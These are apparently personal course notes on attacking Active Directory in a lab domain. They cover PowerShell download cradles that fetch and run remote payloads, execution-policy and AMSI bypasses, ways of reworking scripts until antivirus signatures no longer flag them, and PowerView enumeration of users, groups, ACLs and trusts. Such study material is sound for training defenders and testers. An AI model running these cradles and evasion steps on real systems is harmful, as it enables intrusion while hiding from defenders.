## Active Directory Structure 
Think AD as an Forest not a Domain. as only forest is considered as [[security boundary]].
OU are managed by group policies.
Its the features that doesnt have any path but vulnerability get patched.
So we gonna attack features.

### Enumeration from RPCclinet
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

### What are cradles ?
These are like fileless malware that executes inside the memory directly without getting stored on hard drive
**Defence:** AMSI windows.
Ex: 
```powershell
iex(New-Object Net.WebClient).DownloadString('https://webserver/payoad.ps1')
```
So this is a cradle 

In powershell 3 or later we can use 
```powershell
iex(iwr 'https://server/payload.ps1')
```
If you encounter this error:
*iwr : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.*
```powershell
iex(iwr 'http://192.168.43.157:8000/mimi.ps1' -UseBasicParsing)
```



### Tools and techniques
1. ADSI
2. .NET Classes `System.DirectoryServices.ActiveDirectory`
3. Native Executable
4. WMI using Powershell
5. ActiveDirectory Module

### Powershell detection mechanism
1. System-wide transcripton : *every command gets logged along with its output.*
2. Script block logging : *Keywords block like New-Object*  2 Types: Warning level and Verbose level.
3. AntiMalware Scan Interface (AMSI) 
4. Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard) : You cant do or execute anything apart from microsoft own tools.
### Execution Policy
These are not security measure.
Bypasses:
```powershell
powershell -ExecutionPolicy Bypass
powershell -c <cmd> 
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```
### Security Bypasses
1. Use of **Invisi-Shell** for bypassing the security controls in Powershell #detectionBypass 
2. The tool hooks the .Net assemblies
(System.Management.Automation.dll and System.Core.dll) to bypass logging #detectionBypass 
3. It uses a CLR Profiler API to perform the hook.
4. "A Common language runtime" profiler is a dynamic link library (dll) that consists of functions that receives messages from, and send messages to, the CLR by using the profiling API. The Profiler DLL is loaded by the CLR at run time.
#### Using Invisi-Shell
- With admin privileges:
`RunWithPathAdmin.bat`
- With non-admin privileges:
`RunWithRegistryNonAdmin.bat`
- Type exit from the new powershellsession to complete the clean-up
#### AMSI Bypass
- Always load the scripts in memory and avoid detection by AMSI (Cradle) #detectionBypass 
**On Disk:** #detectionBypass 
- We can use the AMSITrigger tool to identify the exact part of a script that is detected.
- Simply provide to the script file to scan it:
`AmsiTrigger_x64.exe -i C:\Invoke_powershelltcp_detected.ps1`
- For the full obfuscation of Powershell scripts, see Invoke-Obfuscation. That is used for obfuscating the AMSI bypass in the course.

### Bypass AV Signature methodology
- Scan using AMSITrigger #detectionBypass 
- Modify the detected code snippet
- Rescan using AMSITrigger
- Repeat the steps 2 and 3 till we get a result cleared.
Example:
Executable triggered that we have a detection.
![[Screenshot 2023-01-07 004726.png]]

We can perform or mold this direct variable into this

Example 2:
Executable triggered that we have a detection.

We can perform or mold this direct variable into this.

## Domain Enumeration

- AD Powershell module (AD-RSAT) (==Works even in CLM==)
- This version [Powerview](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
- Sharpview
- Bloodhound
- ADExplorer


## Steps you look for AD environment

#### Domain
- Get Domain Information
	`Get-Domain`
- Get object of another domain
	`Get-Domain -Domain moneycorp.local`
- Get domain SID for the current domain
	`Get-DomainSID`
- Get domain policy for the current domain
	`Get-DomainPolicyData`
	`(Get-DomainPolicyData).systemaccess`
	`(Get-DomainPloicyData).Kerberospolicy`
Check for the **SystemAccess** Policy before running any bruteforce 
Check the **Kerberos Policy** which defines the Max Life(For TGT hours),Max Renew Age (days), Max life for TGS (hours)
==So for forging tickets as attacker prospective you need to make or sync the values to the same as Kerberos Policy to **avoid detection**.== #detectionBypass
- Get domain policy for another domain
	`(Get-DomainPolicyData -domain moneycorp.local).systemaccess`


#### Users
- Get a list of users in the current domain
```powershell
Get-DomainUser
Get-DomainUser -Identity student1
```
```powershell
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```
- Get list of all properties for users in the current domain
```powershell
Get-DomainUser -Identity Student1 -Properties *
Get-DomainUser -Properties samaccountname, logonCount
```
==If there is a decoy implanted i.e there is a kerberostable domain admin account so for the confirmation that it is a legit one we need to check its logoncount or always check for the user you using for attacks==
```powershell
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastsetname)}}
```
- Find total number of users
	`Get-DomainUser | select samaccountname | measure`


- Search for a particular string in a user's attributes: #easyWin
	`Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description`
==This could reveal something juicy info as most of the organization stores passwords in the descriptions.==
	`Get-DomainUser -LDAPFilter "Description=*pass*" | select name,Description`

#### Computers
- Get a list of computers in the current domain
```powershell
Get-DomainComputer | select Name
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping
```
```powershell
Get-ADComputer -Filter * |Select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

#### Groups
- Get all the groups in the current Doamin
```powershell
Get-DomainGroup | select Name
Get-DomainGroup *admin* | select Name
Get-DomainGroup -Domain <targetDomain>
```
==Here you can see that \*admin\* does not have Enterprise admin because we are listing domain in current domain not in Forest where Enterprise Admin resides in Forest Root.==
```powershell
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties 
```

- Get all groups containing the word "Admin" in group name
```powershell
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

- List all local groups on a machine (needs admin privs on non-dc machines):
	`Get-NetLocalGroup -ComputerName dcorp-dc ListGroups`
- Get memebers of all the local groups on a machine (needs administrator privs on non-dc machines)
	`Get-NetLocalGroup -ComputerName dcorp-dc -Recurse`
- Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines):
	`Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators`
- Get actively logged users on a computer (needs local admin rights on the target)
	`Get-NetLoggedon -ComputerName <servername>`
- Get locally logged users on a computer (needs remote registry on the target started by-default on server OS)
	`Get-LoggedonLocal -ComputerName dcorp-dc`
- Get the last logged user on a computer (needs administrative rights and remote registry on the target)
	`Get-LastLoggedOn -ComputerName <servername>`

##### Group Members

- Get all the members of the Domain Admins group
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive 
```
- Get Group membership for a user
```powerhshell
Get-DomainGroup -UserName "student1"
Get-ADPrincipalGroupMembership -Identity student1
```
#### Shares
- Find shares on hosts in current domain #veryNoisy
	`Invoke-ShareFinder -Verbose`
- Find sensitive files on computers in the domain #veryNoisy 
	`Invoke-FileFinder -Verbose`
- Get all fileservers of the domain
	`Get-NetFileServer`

#### Group Policies (GPO)
- Manage and configure the changes easily and centrally in AD.
- Allows configuration of - 
	- Security Settings
	- Registry-based policy settings
	- Group policy preferences like startup/shutdown/log-on/logoff scripts settings
	- Software Installation
- GPO can be abused for various attacks like **privesc, backdoors, persistence etc.**

- List of GPO
```powershell
Get-DomainGPO | select DisplayName
```
- List GPO which use a Restricted groups or groups.xml for intersting users
	`Get-DomainGPOLocalGroup`

- Get users which are in local group of a machine using GPO
	`Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1`
- Get machine where the given user is member of a specific group
	`Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose`

#### OUs
- List OUs.
	`Get-DomainOU`
	`Get-ADOrganizationUnit -Filter * -Properties *`
- Get all the Computers in an OU
	`(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name`
- Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
	`Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"`
- Get GPO applied on an specific OU
	`(Get-DomainOU -Identity StudentMachines).gplink`
- Get users which are in a local group of a machine using GPO 
	`Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1`
- Get machines where the given user is member of a specific group
	`Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose`

#### ACL
Access Control Model 
- Enables control on the ability of a process to access objects and other resources in active directory based on:
	- Access Tokens (contains security context of a process - identity and privs of user)
	- Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))

Access control list is a list of Access control entities (ACE) where ACE corresponds to individual permission or audit access. Who has permission and what can be done on an object?
- Two Types:
	1. DACL - Permissions of users/groups on a particular object.
	2. SACL -  Logs Success and Failure audit messages when that object is accessed.
- ACLs are vital to security architecture of AD.

![[acl.png]]

- Get the ACLs associated with the specified object
	`Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs`
- Get the ACLs associated with the specified prefix to be used for search
	`Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose`
- We can also enumerate ACLs using ActiveDirectory module but wihtout resolving GUIDs
	`(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`
- Search for intersting ACL apart from ==bloodhound== i.e you can find "GenericAll" or more.
	`Find-InterestingDomainAdmin -ResolveGUIDs`
- Get the ACLs associated with the specified path:
	`Get-PathAcl -Path '\\dcorp-dc.dollarcorp.moneycorp.local\sysvol'`
- Get ACL for Domain Admin group
	`Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose`
- Find interesting ACL of studenx
	`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Student1"}`

#### Trusts
- In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.
- Trust can be automatic (parent-child, same forest, etc.) or established (forest,external).
- Trusted Domain Objects (TDOs) represent the trust relationships in a domain.

Trust Direction
- One-Way trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.
![[trust direction.png]]

- Transitive - Can be extended to establish trust relationship with other domains.
	- All the default infra-forest trust relationships (Tree-root, Parent-Child) betweem domains within a same forest are transitive two-way trusts.
- Nontransitive - Cannot be extended to other domains in the forest. Can be two-way or one-way.
	- This is default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.

- Default/Automatic trusts
	- Parent-child trust
		- It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, wherever a new 
	- Tree-root trust 
		- It is created automatically between whenever a new domain tree is added to a forest root.
		- This trust is always two-way transitive.


If someone compro any machine on ![[Trust relation 1.png]]

If attacker compromise machine B then attacker can jump to A then A to Y and then Y to Z.

- External trusts
	- Between two domains in different forests when forests do not have a trust relationship
	- Can be one-way or two-way and is nontransitive.
![[External trust.png]]

- Forest trusts
	- Between forest root domain
	- Cannot be extended to a third forest (no implicit trust)
	- Can be one-way or two-way and transitive or non-transitive.

![[forest trust.png]]

Forest 3 can not access Forest 1.
User in Forest 1 can jump to the user in Forest 2.

#### Domain Trust mapping
- Get list of all domain trusts for the current domain.
	`Get-DomainTrust`
	`Get-DomainTrust -Domain us.dollarcorp.moneycorp.local`

	`Get-ADTrust`
	`Get-ADTrust -Identity us.dollarcorp.moneycorp.local`

![[command.png]]

So here are 3 trusts relationships
1 current domain has a trust relationship with forest root `moneycorp.local` 
2 with its Child domain `us.dollarcorp.moneycorp.local`
3 External Domain `eurocorp.local`
All are bidirectional

==So all the commands that we learnt also work for `eurocorp.local` as well. ==

==*Here we can see that `TrustAttributes` is set to* **FILTER_SIDS** *then it is an external trust.*==


#### Forest mapping
- Get details about the current forest
```powershell
Get-Forest
Get-Forest -Forest eurocorp.local

Get-ADForest
Get-ADForest -Identity eurocorp.local
```
- Get all domains in the current forest
```powershell
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local

(Get-ADForest).Domains
```
- Get all global catalogs for the current forest
```powershell
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local

Get-ADForest | select -ExpandProperty GlobalCatalogs
```

- Map trusts of a forest
```powershell
Get-ForestTrust
Get-ForestTrust -Forest eurocorp.local

Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```
- Map External trust in moneycorp.local forest
`Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS "}`


#### User Hunting
- Find all machines on the current domain where the current user has local admin access.
	`Find-LocalAdminAccess -Verbose`
- This function queries the DC of the current or provided for a list of computers (`Get-NetComputer`) and then use multi-threaded `Invoke-CheckLocalAdminAccess` on each machine.
- This can also be dome with the help of remote administration tools like WMI and Powershell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.
- See `Find-WMILocalAdminAccess.ps1` and `Find-PSRemotingLocalAdminAccess.ps1`.
- Find computers where a domain admin session is available and current
	`Find-DomainUserLocation -CheckAccess`
- Find computers (File Server and Distributed File Servers) where a domain admin session is available
	`Find-DomainUserLocation -Stealth`
